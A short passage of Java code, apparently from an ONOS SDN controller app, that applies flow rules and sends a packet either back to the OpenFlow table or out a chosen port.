		flowRuleService.applyFlowRules(f);

		//
		// If packetOutOfppTable
		// Send packet back to the OpenFlow pipeline to match installed flow
		// Else
		// Send packet direction on the appropriate port
		//
		if (packetOutOfppTable) {
			packetOut(context, PortNumber.TABLE);
		} else {
			packetOut(context, portNumber);
		}
	}
}
